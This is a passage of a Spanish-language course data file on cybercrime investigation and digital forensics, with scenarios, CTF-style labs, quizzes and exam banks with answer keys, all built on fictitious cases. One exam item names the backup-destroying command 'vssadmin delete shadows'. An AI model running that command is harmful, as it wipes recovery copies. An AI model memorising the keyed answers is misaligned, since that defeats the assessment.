TX-02  entradas: [RESCATE-A, RESCATE-B, RESCATE-C]  salidas: AGRUPA-9 (1.48 BTC)
TX-03  entradas: [AGRUPA-9]                        salidas: AFILIADO-7 (1.18 BTC), DESARROLLADOR-2 (0.30 BTC)
TX-04  entradas: [AFILIADO-7]                      salidas: EXCHANGE-COL-DEP-551 (1.17 BTC)

Etiquetas conocidas:
  EXCHANGE-COL-DEP-551  → dirección de depósito de un exchange regulado (aplica KYC)
  RESCATE-B, RESCATE-C  → aparecen en notas de rescate de otras víctimas`,
              },
            ],
            questions: [
              { prompt: 'Por la heurística de propiedad común de entradas, ¿qué dirección agrupa los rescates de las tres víctimas?', answers: ['AGRUPA-9', 'agrupa9'], explanation: 'TX-02 gasta RESCATE-A, B y C juntas: probablemente las controla el mismo actor, que las consolida en AGRUPA-9.' },
              { prompt: '¿Qué porcentaje aproximado se queda el desarrollador del ransomware en TX-03? (número entero)', answers: ['20', '20%'], hint: 'Divida la parte del desarrollador entre el total que entra a TX-03.', explanation: '0,30 de 1,48 BTC ≈ 20%: el reparto típico entre desarrollador y afiliado en el modelo de ransomware como servicio.' },
              { prompt: '¿A qué dirección se debe dirigir la solicitud judicial para identificar al titular?', answers: ['EXCHANGE-COL-DEP-551'], explanation: 'El depósito en un exchange regulado es el punto donde el seudónimo se puede vincular a una identidad (KYC) mediante orden judicial.' },
            ],
          },
        ]
      },
      {
        id: 'cca_attribution',
        title: "4. Atribución y Análisis de Hipótesis",
        content: [
          { type: 'text', icon: 'QuestionMarkCircleIcon', text: "Atribuir es explicar quién está detrás con base en evidencia. Los errores más comunes son sesgos: quedarse con la primera hipótesis, buscar solo lo que la confirma o confiar en pistas fáciles de falsificar, como el idioma de un comentario en el código." },
          { type: 'text', icon: 'DocumentTextIcon', text: "El Análisis de Hipótesis en Competencia (ACH) obliga a listar varias explicaciones y evaluar cada evidencia contra todas: gana la hipótesis con menos evidencia en contra, no la que tiene más a favor. Y la conclusión se comunica con un nivel de confianza: bajo, moderado o alto." },
          {
            type: 'scenario',
            title: 'Caso 3: ¿quién está detrás de la campaña?',
            intro: "Dirige el análisis de una campaña de fraude BEC contra varias cooperativas ficticias. El comité le pide una conclusión. Necesita 50 de 60 puntos.",
            start: 'a1',
            maxPoints: 60,
            passPoints: 50,
            steps: {
              a1: {
                text: "Un analista de su equipo afirma: \"El malware tiene comentarios en portugués, así que el grupo es de Brasil\". ¿Cómo responde?",
                choices: [
                  { text: "Lo registro como un indicio débil y fácil de falsificar; planteo varias hipótesis y busco evidencia más sólida (infraestructura, rastro del dinero, patrones de operación).", next: 'a2', points: 20, feedback: "Correcto: es una pista que puede ser una bandera falsa. Se contrasta con otras evidencias." },
                  { text: "Acepto la conclusión: el idioma del código es prueba suficiente.", next: 'a2', points: -10, feedback: "Sesgo de confirmación: el idioma se puede imitar fácilmente." },
                ]
              },
              a2: {
                text: "Tiene tres hipótesis: H1 grupo criminal local, H2 grupo internacional con mulas locales, H3 un insider de una de las cooperativas. Las cuentas receptoras son locales, los dominios se registraron con un proveedor extranjero y los ataques afectaron a cooperativas sin relación entre sí. ¿Qué hipótesis tiene menos evidencia en contra?",
                choices: [
                  { text: "H2: es coherente con las cuentas locales (mulas), la infraestructura extranjera y las víctimas dispersas.", next: 'a3', points: 20, feedback: "Bien aplicado el ACH: H3 choca con víctimas sin relación entre sí, y H1 explica peor la infraestructura extranjera." },
                  { text: "H3: siempre hay un insider.", next: 'a3', points: -10, feedback: "La evidencia (víctimas sin relación entre sí) va en contra de un único insider." },
                ]
              },
              a3: {
                text: "¿Cómo redacta la conclusión para el comité?",
                choices: [
                  { text: "\"Con confianza moderada, la campaña es obra de un grupo internacional que usa mulas locales. Evidencia principal: … Vacíos: … Lo que cambiaría la conclusión: …\"", next: 'fin', points: 20, feedback: "Excelente: conclusión, nivel de confianza, evidencia y vacíos. Así se comunica la inteligencia de forma honesta." },
                  { text: "\"Es un grupo internacional, sin duda alguna.\"", next: 'fin', points: 0, feedback: "Afirmar certeza absoluta sin pruebas definitivas expone al equipo y a la organización." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'cca_law',
        title: "5. Prueba Digital y Cooperación Internacional",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "En Colombia, el Código de Procedimiento Penal (Ley 906 de 2004) regula la cadena de custodia desde su artículo 254 e incluye los mensajes de datos entre los elementos materiales probatorios (artículo 275). La Ley 527 de 1999 reconoce la admisibilidad y la fuerza probatoria de los mensajes de datos." },
          { type: 'text', icon: 'ClosedEnvelopeIcon', text: "Cuando la evidencia está en otro país, el Convenio de Budapest ofrece la preservación expedita de datos (artículo 29) y una red de contacto disponible 24/7 (artículo 35), mientras se tramita la asistencia judicial mutua (MLAT) para obtenerlos formalmente." },
          {
            type: 'memory',
            title: 'Asocie cada norma con lo que aporta',
            pairs: [
              { term: 'Ley 906 de 2004', definition: 'Cadena de custodia y elementos materiales probatorios.' },
              { term: 'Ley 527 de 1999', definition: 'Valor probatorio de los mensajes de datos.' },
              { term: 'Convenio de Budapest, art. 29', definition: 'Preservación expedita de datos en otro país.' },
              { term: 'Convenio de Budapest, art. 35', definition: 'Red de puntos de contacto 24/7.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Una imagen forense del disco tiene un hash SHA-256 distinto al registrado en el acta de adquisición. ¿Qué implica?",
              options: [
                "Nada: los hashes cambian solos con el tiempo.",
                "Que no se puede demostrar la integridad de la evidencia: la defensa puede cuestionarla y perder valor probatorio.",
                "Que hay que recalcular el hash hasta que coincida."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. El hash es la prueba de integridad: si no coincide, la cadena de custodia queda en entredicho.",
                incorrect: "No. Un hash no cambia si los datos no cambian: una diferencia indica alteración o error en la adquisición."
              }
            }
          },
        ]
      },
      {
        id: 'cca_report',
        title: "6. El Informe Pericial y la Audiencia",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Un buen informe pericial tiene: objeto de la pericia, evidencia recibida (con sus hashes), metodología y herramientas (con versión), hallazgos, conclusiones con su grado de certeza y limitaciones. Otro perito, con el mismo material, debe poder reproducir el resultado." },
          { type: 'text', icon: 'HappyUsersIcon', text: "En la audiencia, el perito explica en lenguaje claro, se limita a lo que su evidencia demuestra y reconoce lo que no sabe. Exagerar una conclusión es la forma más rápida de perder credibilidad." },
          {
            type: 'scenario',
            title: 'Caso 4: el contrainterrogatorio',
            intro: "Usted presentó el informe del ransomware en una audiencia ficticia. La defensa lo contrainterroga. Necesita 40 de 50 puntos.",
            start: 'r1',
            maxPoints: 50,
            passPoints: 40,
            steps: {
              r1: {
                text: "Defensa: \"¿Puede afirmar que mi cliente fue quien escribió el comando para borrar las copias de seguridad?\"",
                choices: [
                  { text: "\"Mi análisis demuestra que el comando se ejecutó desde la cuenta svc_backup2 a las 03:30. Identificar a la persona detrás de esa cuenta no es objeto de mi pericia.\"", next: 'r2', points: 25, feedback: "Excelente: responde con precisión y respeta los límites de su evidencia." },
                  { text: "\"Sí, sin duda fue él.\"", next: 'r2', points: -10, feedback: "Su evidencia muestra una cuenta, no una persona. Exagerar le resta credibilidad a todo el informe." },
                ]
              },
              r2: {
                text: "Defensa: \"Los registros del servidor fueron borrados. ¿Cómo sabe que los que usted analizó son auténticos?\"",
                choices: [
                  { text: "\"Los eventos se obtuvieron del sistema central de registros antes del borrado; la copia se adquirió con hash SHA-256, registrado en el acta y verificado en mi laboratorio.\"", next: 'fin', points: 25, feedback: "Correcto: la integridad se demuestra con la cadena de custodia y el hash." },
                  { text: "\"Porque yo los revisé y se veían bien.\"", next: 'fin', points: -10, feedback: "Una opinión no demuestra integridad; el hash y la cadena de custodia sí." },
                ]
              },
              fin: { text: "Fin del contrainterrogatorio." },
            }
          },
        ]
      },
      {
        id: 'cca_capstone',
        title: "7. 🧩 Caso Integrador: Fraude BEC Transnacional",
        content: [
          { type: 'text', icon: 'SpyIcon', text: "Este caso integra todo el recorrido: triage, preservación, análisis de correos y registros, rastro del dinero, cooperación internacional y comunicación de resultados. Tómese su tiempo: cada decisión cuenta." },
          {
            type: 'scenario',
            title: 'Caso integrador: la cooperativa y el proveedor suplantado',
            intro: "Una cooperativa ficticia pagó $95.000.000 a un \"proveedor\" tras un correo con datos bancarios cambiados. La cuenta destino está en otro país. Usted lidera la investigación. Necesita 80 de 100 puntos.",
            start: 'c1',
            maxPoints: 100,
            passPoints: 80,
            steps: {
              c1: {
                text: "Hora cero. ¿Qué tres acciones prioriza?",
                choices: [
                  { text: "Alerta a la entidad financiera para intentar retener el pago, preservación de buzones y registros, y denuncia formal.", next: 'c2', points: 20, feedback: "Correcto: dinero, evidencia y proceso legal, en ese orden de urgencia." },
                  { text: "Reunión de comité para decidir responsables internos.", next: 'c2', points: 0, feedback: "La rendición de cuentas importa, pero después de las acciones urgentes." },
                ]
              },
              c2: {
                text: "El correo con los datos bancarios cambiados vino del dominio real del proveedor, con DMARC aprobado. ¿Qué significa?",
                evidence: "Authentication-Results: spf=pass dkim=pass dmarc=pass header.from=proveedor-real.example",
                choices: [
                  { text: "Que probablemente la cuenta de correo del proveedor fue comprometida: el correo es auténtico técnicamente pero el contenido es fraudulento. Hay que avisarle al proveedor.", next: 'c3', points: 20, feedback: "Exacto: DMARC aprobado no significa mensaje legítimo, solo que salió de un servidor autorizado. Es un BEC por cuenta comprometida." },
                  { text: "Que el correo es legítimo y la cooperativa no tiene de qué preocuparse.", next: 'c3', points: -10, feedback: "DMARC verifica el origen, no la intención. Una cuenta comprometida envía correos que pasan todos los controles." },
                ]
              },
              c3: {
                text: "El proveedor confirma accesos extraños a su correo desde una IP extranjera y una regla de reenvío. ¿Qué pide?",
                choices: [
                  { text: "Que preserve y entregue los registros de acceso y auditoría del buzón, sin borrar la regla hasta documentarla.", next: 'c4', points: 20, feedback: "Bien: primero se documenta la evidencia, luego se remedia." },
                  { text: "Que borre la regla y cambie la contraseña de inmediato, sin guardar nada.", next: 'c4', points: 5, feedback: "Remediar es necesario, pero sin documentar se pierde evidencia clave." },
                ]
              },
              c4: {
                text: "La cuenta que recibió el dinero está en otro país y el banco extranjero no responde a solicitudes informales. ¿Qué camino sigue?",
                choices: [
                  { text: "A través de la Fiscalía: solicitud de preservación por la red 24/7 del Convenio de Budapest y asistencia judicial mutua para obtener los datos.", next: 'c5', points: 20, feedback: "Correcto: es el canal formal que produce evidencia válida." },
                  { text: "Contratar a alguien que \"consiga\" los datos del titular en el exterior.", next: 'c5', points: -20, feedback: "Ilegal e inútil como prueba: puede invalidar el caso y exponer a la cooperativa." },
                ]
              },
              c5: {
                text: "El consejo de la cooperativa pide un informe. ¿Qué incluye?",
                choices: [
                  { text: "Línea de tiempo, monto y estado de recuperación, causa raíz (cuenta del proveedor comprometida y falta de verificación por otro canal), acciones legales y recomendaciones con responsables y fechas.", next: 'fin', points: 20, feedback: "Excelente: hechos, impacto, causa y plan. Así se cierra un caso con aprendizaje." },
                  { text: "Un resumen técnico con los encabezados del correo y los registros.", next: 'fin', points: 5, feedback: "Útil como anexo, pero el consejo necesita impacto, causa y decisiones." },
                ]
              },
              fin: { text: "Fin del caso integrador. Revise su puntaje: si aprobó, está listo para el examen final." },
            }
          },
        ]
      },
      {
        id: 'cca_exam',
        title: "8. 📝 Examen del Nivel Avanzado",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Examen final del mapa de expertise: 12 preguntas al azar de un banco de 16, con 80% para aprobar. Al aprobarlo obtendrá el badge de Investigador Cibercriminal · Nivel Avanzado." },
          {
            type: 'exam',
            title: 'Examen: Investigador Cibercriminal · Avanzado',
            description: 'Evalúa ransomware y eventos de Windows, criptoactivos, atribución, prueba digital, cooperación internacional e informe pericial.',
            passPercent: 80,
            questionsPerAttempt: 12,
            questions: [
              { question: '¿Qué significa "doble extorsión" en ransomware?', options: [{ id: 'a1a', text: 'Robar los datos antes de cifrarlos y amenazar con publicarlos, además de exigir pago por descifrar.', isCorrect: true, score: 10 }, { id: 'a1b', text: 'Cifrar los datos dos veces.', isCorrect: false, score: 0 }, { id: 'a1c', text: 'Atacar a dos empresas al mismo tiempo.', isCorrect: false, score: 0 }], feedback: 'Por eso tener respaldos no basta: también hay que evitar la exfiltración.' },
              { question: 'El evento 4624 con tipo de inicio de sesión 10 indica…', options: [{ id: 'a2a', text: 'Un inicio de sesión exitoso por escritorio remoto.', isCorrect: true, score: 10 }, { id: 'a2b', text: 'Un inicio de sesión fallido en consola.', isCorrect: false, score: 0 }, { id: 'a2c', text: 'La creación de una cuenta.', isCorrect: false, score: 0 }], feedback: 'El tipo 10 (RemoteInteractive) corresponde a RDP.' },
              { question: '¿Qué indica el evento 1102 de Windows?', options: [{ id: 'a3a', text: 'Que se borró el registro de auditoría de seguridad.', isCorrect: true, score: 10 }, { id: 'a3b', text: 'Que se instaló un servicio.', isCorrect: false, score: 0 }, { id: 'a3c', text: 'Que se cambió una contraseña.', isCorrect: false, score: 0 }], feedback: 'Es una señal de intento de ocultar rastros.' },
              { question: '¿Para qué ejecuta un atacante "vssadmin delete shadows" antes de cifrar?', options: [{ id: 'a4a', text: 'Para borrar las instantáneas de volumen e impedir la recuperación sin pagar.', isCorrect: true, score: 10 }, { id: 'a4b', text: 'Para acelerar el disco.', isCorrect: false, score: 0 }, { id: 'a4c', text: 'Para crear una copia de seguridad propia.', isCorrect: false, score: 0 }], feedback: 'Es un paso típico previo al cifrado.' },
              { question: 'La heurística de propiedad común de entradas sostiene que…', options: [{ id: 'a5a', text: 'Las direcciones gastadas juntas en una misma transacción probablemente pertenecen al mismo dueño.', isCorrect: true, score: 10 }, { id: 'a5b', text: 'Todas las direcciones de un exchange son del mismo cliente.', isCorrect: false, score: 0 }, { id: 'a5c', text: 'Cada dirección pertenece a una persona distinta.', isCorrect: false, score: 0 }], feedback: 'Es la base del agrupamiento (clustering) de direcciones.' },
              { question: '¿Dónde suele ser posible vincular una dirección de criptoactivos con una identidad?', options: [{ id: 'a6a', text: 'En un exchange regulado que aplica KYC, mediante orden judicial.', isCorrect: true, score: 10 }, { id: 'a6b', text: 'En la propia cadena de bloques, que guarda nombres y cédulas.', isCorrect: false, score: 0 }, { id: 'a6c', text: 'En ningún lugar: es imposible.', isCorrect: false, score: 0 }], feedback: 'La cadena es seudónima; el KYC del exchange conecta el seudónimo con la persona.' },
              { question: 'En el Análisis de Hipótesis en Competencia (ACH), la hipótesis preferida es…', options: [{ id: 'a7a', text: 'La que tiene menos evidencia en contra.', isCorrect: true, score: 10 }, { id: 'a7b', text: 'La que se propuso primero.', isCorrect: false, score: 0 }, { id: 'a7c', text: 'La que prefiere el jefe del equipo.', isCorrect: false, score: 0 }], feedback: 'Así se reduce el sesgo de confirmación.' },
              { question: 'Los comentarios en otro idioma dentro de un malware son…', options: [{ id: 'a8a', text: 'Un indicio débil y fácil de falsificar para atribuir.', isCorrect: true, score: 10 }, { id: 'a8b', text: 'Prueba definitiva del país del autor.', isCorrect: false, score: 0 }, { id: 'a8c', text: 'Irrelevantes siempre.', isCorrect: false, score: 0 }], feedback: 'Pueden ser banderas falsas; se contrastan con otras evidencias.' },
              { question: '¿Qué norma colombiana regula la cadena de custodia en el proceso penal?', options: [{ id: 'a9a', text: 'La Ley 906 de 2004 (Código de Procedimiento Penal).', isCorrect: true, score: 10 }, { id: 'a9b', text: 'La Ley 1581 de 2012.', isCorrect: false, score: 0 }, { id: 'a9c', text: 'La Ley 1273 de 2009.', isCorrect: false, score: 0 }], feedback: 'La cadena de custodia se regula desde su artículo 254.' },
              { question: '¿Qué reconoce la Ley 527 de 1999?', options: [{ id: 'a10a', text: 'La admisibilidad y la fuerza probatoria de los mensajes de datos.', isCorrect: true, score: 10 }, { id: 'a10b', text: 'Los delitos informáticos.', isCorrect: false, score: 0 }, { id: 'a10c', text: 'La protección de datos personales.', isCorrect: false, score: 0 }], feedback: 'Es la base del valor probatorio de la evidencia digital.' },
              { question: 'El artículo 29 del Convenio de Budapest permite…', options: [{ id: 'a11a', text: 'Solicitar a otro país la preservación expedita de datos almacenados.', isCorrect: true, score: 10 }, { id: 'a11b', text: 'Extraditar automáticamente a cualquier sospechoso.', isCorrect: false, score: 0 }, { id: 'a11c', text: 'Acceder sin autorización a servidores extranjeros.', isCorrect: false, score: 0 }], feedback: 'Se preserva primero; se obtiene después por asistencia judicial mutua.' },
              { question: 'Si el hash de una imagen forense no coincide con el del acta de adquisición…', options: [{ id: 'a12a', text: 'No se puede demostrar la integridad de la evidencia.', isCorrect: true, score: 10 }, { id: 'a12b', text: 'Se ajusta el acta con el nuevo hash.', isCorrect: false, score: 0 }, { id: 'a12c', text: 'No tiene importancia.', isCorrect: false, score: 0 }], feedback: 'El hash demuestra que la evidencia no fue alterada.' },
              { question: '¿Qué debe permitir la sección de metodología de un informe pericial?', options: [{ id: 'a13a', text: 'Que otro perito reproduzca el análisis y llegue al mismo resultado.', isCorrect: true, score: 10 }, { id: 'a13b', text: 'Ocultar las herramientas usadas.', isCorrect: false, score: 0 }, { id: 'a13c', text: 'Convencer al juez sin necesidad de evidencia.', isCorrect: false, score: 0 }], feedback: 'La reproducibilidad es lo que da solidez científica al peritaje.' },
              { question: 'En la audiencia le preguntan algo que su evidencia no permite responder. ¿Qué hace?', options: [{ id: 'a14a', text: 'Lo dice claramente y se limita a lo que su análisis demuestra.', isCorrect: true, score: 10 }, { id: 'a14b', text: 'Responde lo que cree más probable, como si fuera un hecho.', isCorrect: false, score: 0 }, { id: 'a14c', text: 'Evita la pregunta cambiando de tema.', isCorrect: false, score: 0 }], feedback: 'Reconocer límites protege la credibilidad del informe.' },
              { question: 'Un correo fraudulento pasó SPF, DKIM y DMARC. ¿Cuál es la explicación más probable?', options: [{ id: 'a15a', text: 'Se envió desde una cuenta legítima comprometida.', isCorrect: true, score: 10 }, { id: 'a15b', text: 'No puede ser fraudulento si pasó los controles.', isCorrect: false, score: 0 }, { id: 'a15c', text: 'Los controles no funcionan nunca.', isCorrect: false, score: 0 }], feedback: 'Los controles validan el origen técnico, no la intención del mensaje.' },
              { question: 'En un fraude BEC transnacional, ¿cuál es el canal correcto para obtener datos de una cuenta en el exterior?', options: [{ id: 'a16a', text: 'La Fiscalía, mediante preservación por la red 24/7 y asistencia judicial mutua.', isCorrect: true, score: 10 }, { id: 'a16b', text: 'Un contacto informal en el banco extranjero.', isCorrect: false, score: 0 }, { id: 'a16c', text: 'Un servicio que vende datos bancarios.', isCorrect: false, score: 0 }], feedback: 'Solo el canal formal produce evidencia válida.' },
            ],
          },
        ]
      },
    ]
  },
  forensic_intermedio: {
    title: "Perito Forense Digital · Nivel Intermedio",
    description: "Manos a la evidencia: adquisición y preservación, cadena de custodia, sistemas de archivos y firmas, artefactos de Windows y dispositivos móviles. Laboratorios prácticos y examen con nota mínima del 70%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'fdi_intro',
        title: "1. 🗺️ Bienvenida al Nivel Intermedio",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "En el Nivel Básico conoció qué es la forensia digital y por qué importa la cadena de custodia. Ahora trabajará con evidencia: formularios de custodia, listados de archivos, registros de Windows y artefactos que revelan qué pasó en un equipo." },
          { type: 'text', icon: 'AlarmIcon', text: "Este nivel incluye laboratorios de decisión, retos tipo CTF y un examen que se aprueba con 70%. Todos los casos y datos son ficticios." },
          {
            type: 'interactive',
            title: 'Vocabulario del perito',
            items: [
              { term: 'Imagen forense', definition: 'Copia bit a bit de un medio de almacenamiento, incluido el espacio libre y lo borrado. Se analiza la copia, nunca el original.' },
              { term: 'Bloqueador de escritura', definition: 'Dispositivo o software que permite leer un disco sin modificarlo en absoluto.' },
              { term: 'Hash', definition: 'Huella matemática del contenido (por ejemplo SHA-256). Si cambia un solo bit, cambia el hash: así se demuestra la integridad.' },
              { term: 'Artefacto', definition: 'Rastro que deja el sistema o el usuario: un acceso directo, una entrada de registro, un archivo de prefetch, un historial.' },
              { term: 'Línea de tiempo', definition: 'Ordenar cronológicamente los eventos de distintas fuentes para reconstruir lo ocurrido.' },
            ]
          },
        ]
      },
      {
        id: 'fdi_acquisition',
        title: "2. Adquisición y Preservación",
        content: [
          { type: 'text', icon: 'LockIcon', text: "Se recolecta primero lo más volátil (RFC 3227): memoria RAM, conexiones de red y procesos se pierden al apagar. El disco se adquiere después, con bloqueador de escritura, generando una imagen y calculando su hash en el mismo momento." },
          { type: 'text', icon: 'AlarmIcon', text: "Atención al cifrado: si un equipo encendido tiene el disco cifrado (por ejemplo con BitLocker), apagarlo puede dejar la información inaccesible. En ese caso se evalúa capturar la memoria o hacer una adquisición en vivo antes de apagar." },
          {
            type: 'scenario',
            title: 'Caso 1: la diligencia en la oficina',
            intro: "Acompaña una diligencia autorizada en la oficina de un empleado ficticio sospechoso de filtrar información. El portátil está encendido y desbloqueado. Necesita 60 de 80 puntos.",
            start: 'd1',
            maxPoints: 80,
            passPoints: 60,
            steps: {
              d1: {
                text: "Lo primero que observa es el portátil encendido, con una sesión abierta. ¿Qué hace?",
                choices: [
                  { text: "Fotografío la pantalla y el entorno, documento la hora y evito tocar el teclado mientras evalúo qué recolectar.", next: 'd2', points: 20, feedback: "Correcto: documentar el estado inicial antes de intervenir es la base de todo." },
                  { text: "Lo apago de inmediato para que nadie lo manipule.", next: 'd2', points: -10, feedback: "Riesgoso: perdería la RAM y, si el disco está cifrado, quizá el acceso a todo." },
                  { text: "Reviso las carpetas del usuario para ver si hay algo interesante.", next: 'd2', points: -10, feedback: "Navegar modifica fechas de acceso y contamina la evidencia." },
                ]
              },
              d2: {
                text: "Nota un ícono que indica que el disco está cifrado con BitLocker. ¿Cuál es la prioridad?",
                choices: [
                  { text: "Capturar la memoria RAM con una herramienta forense desde un medio externo y, si es posible, una adquisición lógica en vivo antes de apagar.", next: 'd3', points: 20, feedback: "Exacto: con el equipo encendido, el contenido es accesible; al apagar podría quedar cifrado." },
                  { text: "Apagar y llevar el disco al laboratorio: allá se descifra.", next: 'd3', points: -10, feedback: "Sin la clave de recuperación, el disco cifrado puede ser imposible de analizar." },
                ]
              },
              d3: {
                text: "Terminada la captura en vivo, ¿cómo procede con el disco?",
                choices: [
                  { text: "Apago, retiro el disco, lo conecto con bloqueador de escritura, genero la imagen y calculo su SHA-256, registrándolo todo en el formato de cadena de custodia.", next: 'd4', points: 20, feedback: "Correcto: imagen, hash y documentación en el mismo acto." },
                  { text: "Copio los archivos del usuario a una memoria USB, arrastrándolos con el explorador.", next: 'd4', points: 0, feedback: "Una copia lógica pierde lo borrado y los metadatos, y no deja un hash del original." },
                ]
              },
              d4: {
                text: "¿Cómo embala y entrega la evidencia?",
                choices: [
                  { text: "En bolsa antiestática sellada, rotulada, con el formato de cadena de custodia firmado por quien entrega y quien recibe, con fecha y hora.", next: 'fin', points: 20, feedback: "Bien: cada traspaso queda registrado." },
                  { text: "En mi maletín personal; lo registro al llegar a la oficina.", next: 'fin', points: -10, feedback: "Un tramo sin registro rompe la cadena de custodia." },
                ]
              },
              fin: { text: "Fin de la diligencia. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'fdi_custody',
        title: "3. 🚩 Laboratorio: Integridad y Cadena de Custodia",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "El formato de cadena de custodia registra cada persona que tuvo la evidencia, cuándo y para qué. Junto con el hash, es lo que permite afirmar en juicio que la evidencia analizada es la misma que se recolectó." },
          {
            type: 'challenge',
            title: 'Revise el expediente EV-2026-114',
            brief: "Usted debe revisar la cadena de custodia y la verificación de hashes de una evidencia ficticia antes de emitir su informe. Encuentre los problemas.",
            artifacts: [
              {
                name: 'cadena_custodia.txt',
                content: `EVIDENCIA: EV-2026-114 · Disco SSD 512 GB · Serie S4EVNX0R112233
#  fecha/hora          entrega              recibe               motivo
1  2026-10-05 10:40    Téc. J. Morales      Téc. J. Morales      Recolección en sitio
2  2026-10-05 15:10    Téc. J. Morales      Custodia A. Pérez    Ingreso a almacén
3  2026-10-08 09:00    Custodia A. Pérez    Perito L. Gómez      Análisis
4  2026-10-12 17:30    Perito L. Gómez      Custodia A. Pérez    Devolución a almacén
5  2026-10-14 08:15    Perito R. Díaz       Custodia A. Pérez    Devolución a almacén`,
              },
              {
                name: 'verificacion_hash.txt',
                content: `Imagen: EV-2026-114.E01
SHA-256 registrado al adquirir (2026-10-05): 9f2c...a71e
SHA-256 verificado (2026-10-08, L. Gómez):   9f2c...a71e   COINCIDE
SHA-256 verificado (2026-10-14, A. Pérez):   4b07...19cd   NO COINCIDE`,
              },
            ],
            questions: [
              { prompt: '¿Qué perito aparece devolviendo la evidencia sin haber registrado nunca que la recibió?', answers: ['R. Díaz', 'R Diaz', 'Díaz', 'Diaz', 'Perito R. Díaz'], hint: 'Compare quién recibe y quién entrega en cada fila.', explanation: 'R. Díaz entrega en la fila 5, pero ninguna fila registra que la haya recibido: hay un traspaso sin documentar entre el 12 y el 14 de octubre.' },
              { prompt: '¿En qué fecha se detectó que el hash ya no coincide? (AAAA-MM-DD)', answers: ['2026-10-14'], explanation: 'El 14 de octubre el hash no coincide con el de adquisición: la imagen fue alterada o reemplazada.' },
              { prompt: '¿Entre qué número de fila de la cadena y cuál otro está el tramo sin registro? (escriba "4-5")', answers: ['4-5', '4 - 5', '4 y 5'], explanation: 'Entre la devolución del 12 de octubre (fila 4) y la del 14 (fila 5) la evidencia salió del almacén sin registro. Ese tramo, sumado al hash distinto, compromete la evidencia.' },
            ],
          },
        ]
      },
      {
        id: 'fdi_filesystem',
        title: "4. 🚩 Sistemas de Archivos, Metadatos y Firmas",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Un archivo borrado no desaparece de inmediato: el sistema marca su espacio como libre y el contenido permanece hasta que se sobrescribe. Por eso la imagen forense incluye el espacio libre." },
          { type: 'text', icon: 'BugIcon', text: "La extensión de un archivo se cambia con un clic; su firma (los primeros bytes, o \"número mágico\") no. Algunas firmas: PDF empieza por 25 50 44 46 (\"%PDF\"), JPEG por FF D8 FF, PNG por 89 50 4E 47, ZIP y DOCX por 50 4B 03 04, y los ejecutables de Windows por 4D 5A (\"MZ\")." },
          {
            type: 'challenge',
            title: 'Archivos que no son lo que dicen',
            brief: "Del portátil del caso anterior se extrajo este listado con los primeros bytes de cada archivo. Encuentre las inconsistencias.",
            artifacts: [
              {
                name: 'listado_archivos.txt',
                content: `ruta                                         primeros bytes   modificado            estado
C:\\Users\\cvargas\\Documents\\informe_q3.pdf      25 50 44 46      2026-09-30 16:02      activo
C:\\Users\\cvargas\\Documents\\factura_0921.pdf    4D 5A 90 00      2026-10-02 23:47      activo
C:\\Users\\cvargas\\Pictures\\vacaciones.jpg       50 4B 03 04      2026-10-03 00:12      activo
C:\\Users\\cvargas\\Pictures\\perfil.png           89 50 4E 47      2026-08-11 09:20      activo
C:\\Users\\cvargas\\Desktop\\clientes_2026.xlsx    50 4B 03 04      2026-10-03 00:05      BORRADO (recuperable)`,
              },
            ],
            questions: [
              { prompt: '¿Qué archivo con extensión .pdf es en realidad un ejecutable de Windows? (nombre del archivo)', answers: ['factura_0921.pdf'], hint: 'Busque la firma 4D 5A ("MZ").', explanation: 'factura_0921.pdf empieza por 4D 5A: es un ejecutable disfrazado de PDF, una técnica común para engañar al usuario.' },
              { prompt: '¿Qué "imagen" es en realidad un archivo comprimido (ZIP)?', answers: ['vacaciones.jpg'], explanation: 'vacaciones.jpg tiene la firma 50 4B 03 04 (ZIP): puede ocultar documentos dentro de un archivo con nombre inocente.' },
              { prompt: '¿Qué archivo borrado se puede recuperar porque su espacio no se ha sobrescrito?', answers: ['clientes_2026.xlsx'], explanation: 'clientes_2026.xlsx fue borrado poco antes de crear el ZIP disfrazado: un indicio de que la base de clientes pudo empaquetarse para sacarla.' },
            ],
          },
        ]
      },
      {
        id: 'fdi_windows',
        title: "5. 🚩 Artefactos de Windows",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Windows guarda rastros de lo que hace el usuario. Prefetch registra programas ejecutados y cuándo; los accesos directos (.lnk) y las Jump Lists recuerdan archivos abiertos, incluso desde memorias USB; y el registro guarda los dispositivos USB conectados (clave USBSTOR)." },
          {
            type: 'challenge',
            title: '¿Salió la información en una memoria USB?',
            brief: "Siga el rastro en el registro y en los accesos directos del portátil ficticio para determinar si la base de clientes se copió a una USB.",
            artifacts: [
              {
                name: 'registro_USBSTOR.txt',
                content: `HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR
  Disk&Ven_Kingston&Prod_DataTraveler_3.0&Rev_PMAP
    Serie: 60A44C4136A2F1B0&0
    FriendlyName: Kingston DataTraveler 3.0 USB Device
    Primera conexión: 2026-10-03 00:14:51
    Última conexión:  2026-10-03 00:22:09
MountedDevices:  \\DosDevices\\E:  →  Kingston DataTraveler (60A44C4136A2F1B0)`,
              },
              {
                name: 'accesos_directos_lnk.txt',
                content: `Archivo LNK                         Destino                          Volumen      Abierto
vacaciones.lnk                      E:\\vacaciones.jpg                USB (E:)     2026-10-03 00:16:40
clientes_2026.lnk                   C:\\Users\\cvargas\\Desktop\\...   Disco (C:)   2026-10-02 23:58:12`,
              },
              {
                name: 'prefetch.txt',
                content: `Programa              Ejecuciones   Última ejecución
7Z.EXE-6A19B3C2.pf    1             2026-10-03 00:11:58
EXPLORER.EXE-...pf    —             —`,
              },
            ],
            questions: [
              { prompt: '¿Cuál es el número de serie de la memoria USB conectada?', answers: ['60A44C4136A2F1B0', '60A44C4136A2F1B0&0'], explanation: 'El serial 60A44C4136A2F1B0 identifica la memoria Kingston: si se incauta, puede compararse con este registro.' },
